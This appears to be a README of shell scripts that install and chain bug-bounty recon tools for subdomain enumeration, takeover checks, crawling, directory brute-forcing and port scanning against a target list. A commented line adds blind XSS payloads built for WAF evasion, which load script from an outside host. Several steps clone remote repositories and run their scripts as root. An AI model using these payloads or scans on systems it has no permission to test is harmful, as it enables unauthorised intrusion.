## Install
```
#copy to .sh ,then  
#source .sh  

mkdir /root/script

#time=`date "+%Y-%m-%d_%H:%M:%S"` ; echo "curl -X POST -H \"Content-type:application/json\" --data '{\"text\":\"${time}\"}' https://hooks.slack.com/services/token/token/token" > /root/script/slack.sh ; bash /root/script/slack.sh ; rm /root/script/slack.sh  
#replace https://URL to your slack webhook , then copy into /root/script/webhook.sh
#sed "s,    '<sCriPt sRc=//14.rs>'\,,    'ceye.url'\,\n    '<sCriPt sRc=//14.rs>'\,\n    '\"><script src=blindxss></script>'\,\n    'httpceye.url/'\,,g" core/config.py > 1.txt ; mv 1.txt core/config.py ; sed "s,blindPayload = '',blindPayload = (  # Payloads for filter & WAF evasion\n    '\"><script src=blindxss></script>'\,\n    '\"><img src=xxssonerror=eval(atob(this.id))>'\,\n    '\<script>$.getScript(\"//xss\")</script>'),g" core/config.py > 1.txt ; mv 1.txt core/config.py
#replace URL to your blind payload , then copy into /root/script/xss.sh
#token=""
#sed "s/'token': 'token'token 'token': 'token'/${token}/g" /root/script/git/github_dis/github.py > 1.txt ; mv 1.txt /root/script/git/github_dis/github.py
#/root/script/cookie.sh
  
cd /root/
apt update
yes|apt install ruby ruby-dev libcurl4-openssl-dev libldns-dev vim xdg-utils iceweasel screen aptitude make zlib1g-dev git gcc g++ make libxml2 libxml2-dev libxslt1-dev ruby-dev build-essential libgmp-dev zlib1g-dev libpcap-dev iftop nano wget curl zlib* openssl libssl-dev libsqlite3-dev build-essential libssl-dev libcurl4-openssl-dev libffi-dev python-dev parallel tmux aria2
apt install --fix-missing
echo 'set -g prefix C-a'>>/root/.tmux.conf ; echo 'unbind C-b'>>/root/.tmux.conf
wget https://github.com/BurntSushi/ripgrep/releases/download/11.0.2/ripgrep-11.0.2-x86_64-unknown-linux-musl.tar.gz
tar xzvf ripgrep-11.0.2-x86_64-unknown-linux-musl.tar.gz
cp ripgrep-11.0.2-x86_64-unknown-linux-musl/rg  /usr/local/bin/
rm ripgrep-11.0.2-x86_64-unknown-linux-musl.tar.gz

yes|apt install ruby
apt install --fix-missing
yes|apt install ruby-dev
apt install --fix-missing
var=$(ruby -v|grep -oP ".\..\..")
cd /etc/alternatives
ln -sf /usr/bin/ruby$var ruby

cd /root
var=$(curl -L golang.org/dl/|grep -oP "(?<=\<a\ class\=\"download\ downloadBox\"\ href\=\").*?(?=linux\-amd64\.tar\.gz\"\>)") ; last=linux-amd64.tar.gz ; var=$var$last ; wget $var
load=${var//https\:\/\/dl\.google\.com\/go\//} ; tar -xzf $load -C /usr/local ; rm $load
echo 'export EDITOR=nano'>>/root/.profile
echo 'export GOROOT=/usr/local/go'>>/root/.profile
mkdir /root/GOPATH
echo 'export GOPATH=/root/GOPATH'>>/root/.profile
echo 'export PATH=$PATH:$GOROOT/bin:$GOPATH/bin'>>/root/.profile
source /root/.profile

apt install -y -q python3-pip
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
python get-pip.py
rm get-pip.py

cd /root/
#git clone https://github.com/fngoo/xunfeng ; sh xunfeng/xunfeng.sh ; rm -r /root/xunfeng


mkdir /root/script

#cd /root/
#python3 -m pip install --upgrade urlwatch
#urlwatch
#git clone https://github.com/fngoo/txt
#cd txt
#> /root/.config/urlwatch/urlwatch.yaml
#cat 1.txt >/root/.config/urlwatch/urlwatch.yaml
#cd /root/ ; rm -r /root/txt
#echo '1' > /root/.config/urlwatch/urls.yaml
#> /root/.config/urlwatch/urls.yaml

mkdir /root/script/git
cd /root/script/git
git clone https://github.com/fngoo/github_dis
pip install truffleHog

mkdir /root/script/0_subdomain
cd /root/
#go get github.com/subfinder/subfinder
pip install py-altdns
cd /root/script/0_subdomain
git clone https://github.com/aboul3la/Sublist3r
cd Sublist3r
pip3 install -r requirements.txt
cd /root/script/0_subdomain
git clone https://github.com/infosec-au/altdns
cd altdns/
python setup.py install
git clone https://github.com/assetnote/commonspeak2-wordlists
mv commonspeak2-wordlists/subdomains/subdomains.txt words_large.txt ; cat words.txt >> words_large.txt
rm -r commonspeak2-wordlists
#git clone https://gist.github.com/jhaddix/86a06c5dc309d08580a018c66354a056
#cat 86a06c5dc309d08580a018c66354a056/all.txt >> words.txt ; rm -r 86a06c5dc309d08580a018c66354a056
#cd /root/script/0_subdomain
#git clone https://github.com/nsonaniya2010/SubDomainizer.git
#cd SubDomainizer
#python3 -m pip install -r requirements.txt
cd /root/script/0_subdomain
git clone https://github.com/blechschmidt/massdns
cd massdns ; make ; make install
cd /root/script/0_subdomain/massdns/scripts ; bash get-resolvers.sh

pip3 install awscli --upgrade --user
mkdir /root/script/1_aws
cd /root/script/1_aws
git clone https://github.com/fngoo/AWSBucketDump && cd AWSBucketDump && python3 -m pip install -r requirements.txt
cd /root/script/1_aws
git clone https://github.com/initstring/cloud_enum ; cd cloud_enum && python3 -m pip install -r requirements.txt

mkdir /root/script/2_subjack
cd /root/script/2_subjack
cd /root/
go get github.com/haccer/subjack
go get -u github.com/rverton/webanalyze/...

mkdir /root/script/3_httprobe
cd /root/script/3_httprobe
cd /root/
go get -u github.com/tomnomnom/httprobe
cd /root/script/3_httprobe
git clone https://github.com/verovaleros/webcrawler ; mv webcrawler/crawler.py crawler.py ; rm -r webcrawler
cd /root/script/3_httprobe
git clone https://github.com/s0md3v/Arjun
cd /root/script/3_httprobe
git clone https://github.com/s0md3v/XSStrike ; cd /root/script/3_httprobe/XSStrike ; pip3 install -r requirements.txt
cd /root/script/3_httprobe
#git clone https://github.com/Threezh1/JSFinder
git clone https://github.com/GerbenJavado/LinkFinder ; cd LinkFinder ; pip3 install -r requirements.txt ; python3 setup.py install
cd /root/script/3_httprobe
git clone https://github.com/anouarbensaad/vulnx.git
cd vulnx
sed "s,sudo ,,g" install.sh > 1.sh ; mv 1.sh install.sh
bash install.sh

cd /root/
go get github.com/tomnomnom/waybackurls

mkdir /root/script/4_getjs
cd /root/script/4_getjs
git clone https://github.com/FortyNorthSecurity/EyeWitness
cd EyeWitness/setup ; bash setup.sh ; bash setup.sh ; pip3 install --upgrade pyasn1-modules
cd /root/
go get github.com/003random/getJS
pip install vl


mkdir /root/script/5_dir
cd /root/script/5_dir
git clone https://github.com/maurosoria/dirsearch
echo "home/template/wxserver.asmx" >> /root/script/5_dir/dirsearch/db/dicc.txt

mkdir /root/script/6_port
cd /root/script/6_port
git clone https://github.com/gm09519/host2ip
cd host2ip
sed "s,ip=\"N\/A\",continue,g" host2ip.py host2ip.py > 1.py ; mv 1.py host2ip.py
cd /root/
yes|apt install nmap
apt install --fix-missing
cd /root/script/6_port
git clone https://github.com/lanpan999/Check_Unauth
cd Check_Unauth
python3 -m pip install -r requirements.txt
python3 -m pip install pymongo
cd /root/script/6_port
git clone https://github.com/fngoo/masscan_to_nmap-1
cd masscan_to_nmap-1
pip install prettytable
pip install -r requirements.txt
git clone https://github.com/robertdavidgraham/masscan
cd masscan
make -j
```
## SubDomain
```
target=/root/url.txt

var=$target ; export var=$target
mkdir /root/script/domains_Github/wildcards/domains ; output=/root/script/domains_Github/wildcards/domains ; export output=/root/script/domains_Github/wildcards/domains

cd /root/;mkdir /root/script;mkdir /root/zip;mkdir /root/script/domains_Github;mkdir /root/script/domains_Github/domains;cd /root/script/domains_Github/domains;touch comm.txt;touch mmoc.txt;mkdir /root/script/domains_Github/wildcards;cd /root/script/domains_Github/wildcards;touch wilds.txt;touch cards.txt;mkdir /root/script/domains_Github/0_subdomain;cd /root/script/domains_Github/0_subdomain;touch keep.txt;touch peek.txt;mkdir /root/watch;touch /root/watch/1.txt

cd /root/script/0_subdomain/massdns/scripts ; bash get-resolvers.sh

cd /root/script/0_subdomain ; rm -r Sublist3r ; git clone https://github.com/aboul3la/Sublist3r ; cd Sublist3r ; pip3 install -r requirements.txt
for one in `cat $var`
do
echo "$one" > /root/script/one.txt
txt=/root/script/one.txt
cd /root/script/0_subdomain/Sublist3r ; python3 sublist3r.py -v -d $one -o /root/script/0_subdomain/0_sublist.txt ; sleep 6 ; cat /root/script/0_subdomain/0_sublist.txt >> /root/script/subfinder.txt ; > /root/script/0_subdomain/0_sublist.txt
if [ -s /root/script/subfinder.txt ]
then
cat /root/script/subfinder.txt | massdns -r /root/script/0_subdomain/massdns/lists/resolvers.txt --root -t A -s 222 -o S -w results.txt ; rg -oP "\ A.*" results.txt > ag.txt ; sort -u ag.txt -o ag.txt
for line in `cat ag.txt`
do
num=`rg -oP "$line" results.txt | wc -l`
if [ $num -gt 666 ]
then
grep -v "$line" results.txt > grep_v.txt ; mv grep_v.txt results.txt
fi
done
> ag.txt ; awk -F ". " '{print $1}' results.txt > wordlist-filtered.txt && mv wordlist-filtered.txt results.txt ; sort -u results.txt -o results.txt ; cat results.txt >> /root/script/massdns.txt ; rm results.txt ; sort -u /root/script/massdns.txt -o /root/script/massdns.txt
fi
cat /root/script/massdns.txt >> $var ; rm /root/script/massdns.txt ; cat /root/script/subfinder.txt >> $var ; > /root/script/subfinder.txt
cd /root/script/0_subdomain/altdns ; altdns -i $txt -w words_large.txt -o 2.txt ; cat 2.txt >> /root/script/subfinder.txt ; > 2.txt ; sort -u /root/script/subfinder.txt -o /root/script/subfinder.txt
if [ -s /root/script/subfinder.txt ]
then
cat /root/script/subfinder.txt | massdns -r /root/script/0_subdomain/massdns/lists/resolvers.txt --root -t A -s 222 -o S -w results.txt ; rg -oP "\ A.*" results.txt > ag.txt ; sort -u ag.txt -o ag.txt
> /root/script/one.txt ; > /root/script/subfinder.txt
for line in `cat ag.txt`
do
num=`rg -oP "$line" results.txt | wc -l`
if [ $num -gt 666 ]
then
grep -v "$line" results.txt > grep_v.txt ; mv grep_v.txt results.txt
fi
done
> ag.txt ; awk -F ". " '{print $1}' results.txt > wordlist-filtered.txt && mv wordlist-filtered.txt results.txt ; sort -u results.txt -o results.txt ; cat results.txt >> /root/script/massdns.txt ; rm results.txt ; sort -u /root/script/massdns.txt -o /root/script/massdns.txt
fi
cat /root/script/massdns.txt >> $var ; rm /root/script/massdns.txt
sort -u $var -o $var
done


git clone https://github.com/fngoo/cloud ; bash cloud/cloud.sh ; rm -r cloud ; cd /root/script/2_subjack ; cd $output ; touch 2_Takeover1.txt;touch 2_Takeover2.txt;subjack -w $var   -ssl -a -o $output/2_Takeover1.txt  ; subjack -w $var    -a -o $output/2_Takeover2.txt ; cd /root/script/3_httprobe ; mkdir $output/3_js ; cat $var|httprobe  -p 81 8443 8080 8000 8880 | tee -a httprobe.txt ; git clone https://github.com/fngoo/remove ; mv remove/remove.sh remove.sh ; bash remove.sh ; rm -r remove ; rm remove.sh ; git clone https://github.com/fngoo/crawler ; mv crawler/crawler.sh crawler.sh ; bash crawler.sh ; rm -r crawler ; rm crawler.sh ; git clone https://github.com/fngoo/params ; mv params/params.sh params.sh ; bash params.sh ; rm params.sh ; rm -r params ; git clone https://github.com/fngoo/gethtml ; mv gethtml/gethtml.sh gethtml.sh ; bash gethtml.sh ; rm -r gethtml ; rm gethtml.sh ; git clone https://github.com/fngoo/html_grep ; mv html_grep/html_grep.sh html_grep.sh ; bash html_grep.sh ; rm -r html_grep ; rm html_grep.sh ; git clone https://github.com/fngoo/extractjs ; mv extractjs/extractjs.sh extractjs.sh ; bash extractjs.sh ; rm extractjs.sh ; rm -r extractjs ; cat getjs.txt|grep -o -P "(?<=//).*?(?=/)" >> grep.txt ; sort -u grep.txt -o jstakeover.txt ; cd $output ; touch 3_2_takeover1.txt;touch 3_2_takeover2.txt;subjack -w /root/script/3_httprobe/jstakeover.txt  -ssl -a -o $output/3_2_takeover1.txt ; subjack -w /root/script/3_httprobe/jstakeover.txt  -a -o $output/3_2_takeover2.txt ; cd /root/script/3_httprobe; git clone https://github.com/fngoo/getjs ; mv getjs/getjs.sh getjs.sh ; bash getjs.sh ;  rm -f getjs.sh ; rm -r getjs ; mv httprobe.txt $output/3_httprobe.txt; mv getjs.txt $output/3_getjs.txt ; > grep.txt ; > jstakeover.txt ; cd /root/script/4_getjs ; git clone https://github.com/fngoo/grep ; mv grep/grep.sh grep.sh ; rm -rf grep ; output=$output ; cd $output/3_js ; bash /root/script/4_getjs/grep.sh ; rm /root/script/4_getjs/grep.sh
cd /root ; mkdir $output/5_dir ; git clone https://github.com/fngoo/fordir ; bash fordir/fordir.sh ; rm -r fordir
shuf $output/3_httprobe.txt -o /root/httprobe_all.txt
git clone https://github.com/fngoo/scan ; mv scan/scan.sh scan.sh ; bash scan.sh ; rm -r scan ; rm scan.sh
cd $output;date "+%Y-%m-%d_%H:%M:%S" > /root/time.txt ; sed "s,:,_,g" /root/time.txt > 1time.txt ; mv 1time.txt /root/time.txt;slash=/;dayzoom=`cat /root/time.txt`;addname=_wildcards.txt;zip=.zip;fname=$dayzoom$addname$zip;zip -q -r $fname * ; fname=$slash$dayzoom$addname$zip ; mv $output$fname /root/zip ; mkdir /root/z_juice ; mkdir /root/z_juice$fname ; unzip /root/zip$fname -d /root/z_juice$fname
rm -r $output/*
echo "output.zip------cd /root/zip" ; echo "output.txt------cd /root/z_juice"
```
## Single Domain
```
target=/root/url.txt

var=$target ; export var=$target
mkdir /root/script/domains_Github/wildcards/domains ; output=/root/script/domains_Github/wildcards/domains ; export output=/root/script/domains_Github/wildcards/domains

cd /root/;mkdir /root/script;mkdir /root/zip;mkdir /root/script/domains_Github;mkdir /root/script/domains_Github/domains;cd /root/script/domains_Github/domains;touch comm.txt;touch mmoc.txt;mkdir /root/script/domains_Github/wildcards;cd /root/script/domains_Github/wildcards;touch wilds.txt;touch cards.txt;mkdir /root/script/domains_Github/0_subdomain;cd /root/script/domains_Github/0_subdomain;touch keep.txt;touch peek.txt;mkdir /root/watch;touch /root/watch/1.txt

git clone https://github.com/fngoo/cloud ; bash cloud/cloud.sh ; rm -r cloud ; cd /root/script/2_subjack ; cd $output ; touch 2_Takeover1.txt;touch 2_Takeover2.txt;subjack -w $var   -ssl -a -o $output/2_Takeover1.txt  ; subjack -w $var    -a -o $output/2_Takeover2.txt ; cd /root/script/3_httprobe ; mkdir $output/3_js ; cat $var|httprobe  -p 81 8443 8080 8000 8880 | tee -a httprobe.txt ; git clone https://github.com/fngoo/remove ; mv remove/remove.sh remove.sh ; bash remove.sh ; rm -r remove ; rm remove.sh ; git clone https://github.com/fngoo/crawler ; mv crawler/crawler.sh crawler.sh ; bash crawler.sh ; rm -r crawler ; rm crawler.sh ; git clone https://github.com/fngoo/params ; mv params/params.sh params.sh ; bash params.sh ; rm params.sh ; rm -r params ; git clone https://github.com/fngoo/gethtml ; mv gethtml/gethtml.sh gethtml.sh ; bash gethtml.sh ; rm -r gethtml ; rm gethtml.sh ; git clone https://github.com/fngoo/html_grep ; mv html_grep/html_grep.sh html_grep.sh ; bash html_grep.sh ; rm -r html_grep ; rm html_grep.sh ; git clone https://github.com/fngoo/extractjs ; mv extractjs/extractjs.sh extractjs.sh ; bash extractjs.sh ; rm extractjs.sh ; rm -r extractjs ; cat getjs.txt|grep -o -P "(?<=//).*?(?=/)" >> grep.txt ; sort -u grep.txt -o jstakeover.txt ; cd $output ; touch 3_2_takeover1.txt;touch 3_2_takeover2.txt;subjack -w /root/script/3_httprobe/jstakeover.txt  -ssl -a -o $output/3_2_takeover1.txt ; subjack -w /root/script/3_httprobe/jstakeover.txt  -a -o $output/3_2_takeover2.txt ; cd /root/script/3_httprobe; git clone https://github.com/fngoo/getjs ; mv getjs/getjs.sh getjs.sh ; bash getjs.sh ;  rm -f getjs.sh ; rm -r getjs ; mv httprobe.txt $output/3_httprobe.txt; mv getjs.txt $output/3_getjs.txt ; > grep.txt ; > jstakeover.txt ; cd /root/script/4_getjs ; git clone https://github.com/fngoo/grep ; mv grep/grep.sh grep.sh ; rm -rf grep ; output=$output ; cd $output/3_js ; bash /root/script/4_getjs/grep.sh ; rm /root/script/4_getjs/grep.sh
cd /root ; mkdir $output/5_dir ; git clone https://github.com/fngoo/fordir ; bash fordir/fordir.sh ; rm -r fordir
shuf $output/3_httprobe.txt -o /root/httprobe_all.txt
git clone https://github.com/fngoo/scan ; mv scan/scan.sh scan.sh ; bash scan.sh ; rm -r scan ; rm scan.sh
cd $output;date "+%Y-%m-%d_%H:%M:%S" > /root/time.txt ; sed "s,:,_,g" /root/time.txt > 1time.txt ; mv 1time.txt /root/time.txt;slash=/;dayzoom=`cat /root/time.txt`;addname=_domains.txt;zip=.zip;fname=$dayzoom$addname$zip;zip -q -r $fname * ; fname=$slash$dayzoom$addname$zip ; mv $output$fname /root/zip ; mkdir /root/z_juice ; mkdir /root/z_juice$fname ; unzip /root/zip$fname -d /root/z_juice$fname
rm -r $output/*
echo "output.zip------cd /root/zip" ; echo "output.txt------cd /root/z_juice"
```
